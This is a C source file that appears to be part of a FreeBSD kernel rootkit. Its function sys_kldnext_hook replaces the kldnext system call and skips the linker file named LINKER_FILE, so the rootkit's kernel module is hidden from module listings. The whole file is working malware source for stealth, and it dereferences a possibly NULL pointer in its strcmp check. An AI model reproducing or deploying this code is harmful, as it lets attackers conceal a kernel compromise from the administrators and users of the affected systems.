#include "rootkit.h"

extern struct sx kld_sx;
extern linker_file_list_t linker_files;

static linker_file_t linker_find_file_by_id(int _fileid);
static linker_file_t linker_find_file_by_id(int fileid) {
	linker_file_t lf;

	sx_assert(&kld_sx, SA_XLOCKED);
	TAILQ_FOREACH(lf, &linker_files, link)
		if (lf->id == fileid && lf->flags & LINKER_FILE_LINKED)
			break;
	return (lf);
}

int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap)
{
	linker_file_t lf;
	int error = 0;

	sx_xlock(&kld_sx);
	if (uap->fileid == 0)
		lf = TAILQ_FIRST(&linker_files);
	else {
		lf = linker_find_file_by_id(uap->fileid);
		if (lf == NULL) {
			error = ENOENT;
			goto out;
		}
		lf = TAILQ_NEXT(lf, link);
	}

	/* Skip partially loaded files. */
	while (lf != NULL && !(lf->flags & LINKER_FILE_LINKED))
		lf = TAILQ_NEXT(lf, link);

	if(strcmp(lf->filename, LINKER_FILE) == 0) {
		lf = TAILQ_NEXT(lf, link);
	}

	if (lf)
		td->td_retval[0] = lf->id;
	else
		td->td_retval[0] = 0;
out:
	sx_xunlock(&kld_sx);
	return (error);
}
